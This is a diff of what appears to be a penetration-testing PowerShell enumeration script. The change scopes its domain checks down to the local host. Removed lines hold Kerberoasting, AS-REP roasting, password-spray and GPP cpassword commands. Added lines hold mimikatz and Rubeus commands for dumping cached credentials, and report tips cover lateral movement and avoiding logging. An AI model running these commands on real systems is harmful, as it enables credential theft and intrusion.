@@ -845,50 +845,31 @@ Run "RDP client history" {
 }
 
 # ---------------------------------------------------------------------------
-Section "13. Active Directory / Domain (if joined)"
+Section "13. Domain Membership (this host only)"
 
-Run "Domain membership / trusts" {
-    if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) { nltest /domain_trusts }
-    else { "Not domain joined." }
+Run "Domain & machine account" {
+    $cs = Get-CimInstance Win32_ComputerSystem
+    $cs | Select-Object Domain, PartOfDomain, DomainRole, Name | Format-List
+    if (-not $cs.PartOfDomain) { "Not domain joined (standalone)." }
 }
 
-Run "Domain controllers" { nltest /dclist:$env:USERDNSDOMAIN }
-
-Run "Domain account / group enumeration" {
+Run "Domain controller & site for this host" {
     if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) {
-        "===== domain users ====="
-        net user /domain
-        "===== domain groups ====="
-        net group /domain
-        "===== Domain Admins ====="
-        net group "Domain Admins" /domain
-        "===== Enterprise Admins ====="
-        net group "Enterprise Admins" /domain
-        "===== Domain Controllers ====="
-        net group "Domain Controllers" /domain
+        nltest /dsgetdc:$env:USERDNSDOMAIN
+        "--- site ---"
+        nltest /dsgetsite
     } else { "Not domain joined." }
 }
 
-Run "Group Policy result" {
+Run "Applied Group Policy (RSoP) for this host/user" {
     if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) { gpresult /r }
     else { "Not domain joined." }
 }
 
-Run "Group Policy Preferences passwords (SYSVOL)" {
-    if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) {
-        $sysvol = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
-        if (Test-Path $sysvol) {
-            $script:GppHits = Get-ChildItem $sysvol -Recurse -Filter 'Groups.xml' -ErrorAction SilentlyContinue |
-                Select-String -Pattern 'cpassword'
-            if ($script:GppHits) { $script:GppHits | Select-Object Path, Line }
-            else { "No cpassword entries found." }
-        } else { "SYSVOL not accessible: $sysvol" }
-    } else { "Not domain joined." }
-}
-
-Run "Domain password policy" {
-    if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) { net accounts /domain }
-    else { "Not domain joined." }
+Run "Hybrid / Azure AD join status" {
+    $dsreg = "$env:SystemRoot\System32\dsregcmd.exe"
+    if (Test-Path $dsreg) { & $dsreg /status }
+    else { "dsregcmd not available" }
 }
 
 # ---------------------------------------------------------------------------
@@ -1158,32 +1139,17 @@ if ($taskHits.Count -gt 0) {
         -Commands @('# Replace the action binary or drop a hijacked DLL, then trigger the task','schtasks /run /tn "<task>"')
 }
 
-# ---- Domain / Kerberos ----------------------------------------------------
+# ---- Domain (server-local only) ------------------------------------------
+# The domain itself is out of scope: surface only this host's local domain
+# artifacts (cached tickets, logons, applied GPO). No domain-wide queries.
 if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) {
-    Add-Finding -Severity 'INFO' -Title 'Domain-joined: Kerberos and AD attack surface' -Evidence ("Domain: $env:USERDNSDOMAIN") `
+    Add-Finding -Severity 'INFO' -Title 'Domain-joined host (stay host-local)' -Evidence ("Domain: $env:USERDNSDOMAIN") `
         -Commands @(
-            '# Kerberoast service accounts',
-            'Rubeus.exe kerberoast /outfile:kerberoast.txt',
-            'hashcat -m 13100 kerberoast.txt rockyou.txt',
-            '',
-            '# AS-REP roast accounts without pre-authentication',
-            'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
-            '',
-            '# Collect AD relationships',
-            'SharpHound.exe -c All',
-            '',
-            '# Password spray (mind the lockout policy)',
-            'crackmapexec smb <DC> -u users.txt -p "Spring2026!" --continue-on-success'
-        )
-}
-
-if ($script:GppHits -and @($script:GppHits).Count -gt 0) {
-    $gppEvidence = (@($script:GppHits) | ForEach-Object { "$($_.Path)" + " :: " + "$($_.Line)".Trim() }) -join "`n"
-    Add-Finding -Severity 'CRITICAL' -Title 'Group Policy Preferences password (cpassword) found in SYSVOL' -Evidence $gppEvidence `
-        -Commands @(
-            '# The cpassword is AES-encrypted with a publicly known key:',
-            'gpp-decrypt <cpassword>',
-            '# Then validate the recovered credential against the domain'
+            '# Domain is out of scope - keep everything to this box:',
+            '# Dump tickets / credentials already cached on this host:',
+            'Rubeus.exe dump',
+            'mimikatz.exe "sekurlsa::tickets" "sekurlsa::logonpasswords" exit',
+            '# Review applied GPO (gpresult /r) and cached domain logons (query user).'
         )
 }
 
@@ -1234,7 +1200,7 @@ Write-Rpt "- Check **AlwaysInstallElevated**, **AutoLogon**, **stored credential
 Write-Rpt "- Review **Defender exclusions**, **AppLocker** and **Device Guard** before attempting execution."
 Write-Rpt "- Cross-reference **missing patches** with an exploit suggester (Watson / Windows-Exploit-Suggester)."
 Write-Rpt "- Review **UAC settings**, **accessibility binaries** and **AppInit/IFEO** entries for hijack paths."
-Write-Rpt "- If domain-joined, review **Kerberos tickets**, **domain trusts** and **GPP/SYSVOL cpassword** findings."
+Write-Rpt "- If domain-joined, review this host's **local Kerberos tickets**, **applied GPO** and **cached domain logons** (domain-wide checks are out of scope)."
 Write-Rpt "- Use **SMB shares/sessions**, **RDP/WinRM config** and **logged-on sessions** to plan lateral movement."
 Write-Rpt "- Escalate through **privileged scheduled tasks**, **service binaries** and **DLL hijacks** identified above."
 Write-Rpt "- Keep an eye on **Event ID 4688 / 4104** visibility before running noisy tooling."
@@ -1243,7 +1209,7 @@ Write-Rpt "### Reference tooling"
 Write-Rpt ""
 Write-Rpt "- GTFOBins (Unix), LOLBAS (Windows), PayloadsAllTheThings, HackTricks"
 Write-Rpt "- winPEAS, Seatbelt, SharpUp for a second opinion"
-Write-Rpt "- BloodHound / SharpHound for AD paths; Rubeus for Kerberos abuse"
+Write-Rpt "- Rubeus for local ticket extraction (BloodHound/SharpHound only if the domain is later brought into scope)"
 
 Write-Rpt ""
 Write-Rpt "---"
